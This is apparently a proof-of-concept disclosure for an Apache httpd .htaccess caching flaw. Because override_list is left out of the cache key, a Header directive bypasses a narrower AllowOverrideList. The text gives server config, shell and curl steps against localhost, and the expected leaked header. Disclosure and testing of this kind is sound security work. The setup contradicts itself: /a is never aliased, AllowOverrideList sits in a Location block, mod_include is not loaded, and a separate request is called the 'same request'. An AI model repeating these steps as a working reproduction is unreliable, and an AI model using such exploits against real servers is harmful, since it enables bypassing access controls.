# PoC 069 - .htaccess Cache Omits override_list

`ap_parse_htaccess()` keys its per-request cache on `(dir, override)` only.
A directive permitted under one `AllowOverrideList` is reused for the same
directory under a different list because `override_list` is not part of the
key. Authorization for which directives are valid is therefore not
re-evaluated for the second context.

## Setup

Vulnerable httpd 2.4.66.

`conf/httpd.conf`:

```
ServerName 127.0.0.1
Listen 127.0.0.1:8080
LoadModule alias_module modules/mod_alias.so
LoadModule rewrite_module modules/mod_rewrite.so
LoadModule env_module modules/mod_env.so
LoadModule headers_module modules/mod_headers.so

DocumentRoot /tmp/poc069/docroot

# /a maps to the same physical directory but ALLOWS Header overrides
<Directory "/tmp/poc069/shared">
    AllowOverride None
    AllowOverrideList Header SetEnv
    Require all granted
</Directory>

# /b maps to the same physical directory but DOES NOT allow Header
Alias /b /tmp/poc069/shared
<Directory "/tmp/poc069/shared-restricted">
    # consumed via subrequest below
</Directory>

<Location /a>
    # First mapping - parses .htaccess with override_list = {Header, SetEnv}
    SetHandler default-handler
</Location>

<Location /b>
    # Second mapping - parses .htaccess with override_list = {SetEnv}
    AllowOverrideList SetEnv
    SetHandler default-handler
</Location>
```

A `.htaccess` containing one directive that is permitted under the first
override_list but not the second:

```
mkdir -p /tmp/poc069/shared
cat > /tmp/poc069/shared/.htaccess <<'EOF'
Header set X-Cache-Leak "leaked-from-first-context"
SetEnv FOO bar
EOF
echo hello > /tmp/poc069/shared/index.html
```

Use `mod_rewrite` or `mod_include` to chain a single client request that
walks `/a` *and then* `/b` so both mappings are processed in one request
context that shares `r->htaccess`. A simpler equivalent is a subrequest via
`mod_include`:

```
echo '<!--#include virtual="/b/index.html" -->' > /tmp/poc069/shared/wrap.shtml
```

## Trigger

```
httpd -X -f $PWD/conf/httpd.conf &

# (1) First fetch under /a: parses .htaccess, accepts Header & SetEnv,
#     caches dc keyed on (/tmp/poc069/shared, override=...).
curl -sS -i http://127.0.0.1:8080/a/index.html

# (2) Now fetch under /b inside the SAME request via include/subrequest.
#     Cache lookup matches on (dir, override) and returns the dc that was
#     parsed under override_list={Header,SetEnv}, even though /b's
#     override_list is just {SetEnv}.
curl -sS -i 'http://127.0.0.1:8080/a/wrap.shtml'
```

## Observed effect

The second response (rendered via the subrequest into `/b`) carries the
`X-Cache-Leak` header set by the `Header` directive, even though `/b`'s
`AllowOverrideList SetEnv` should have rejected `Header`:

```
HTTP/1.1 200 OK
X-Cache-Leak: leaked-from-first-context
...
```

`error_log` does not contain the usual
`Header not allowed here` rejection because the directive was never
re-evaluated; `ap_parse_htaccess()` returned the cached `dc` from the first
parse. With the patch applied, lookup and insertion are skipped whenever
`override_list != NULL`. The second context re-parses the file under its
own list, the `Header` directive is rejected, and the response no longer
carries `X-Cache-Leak`.
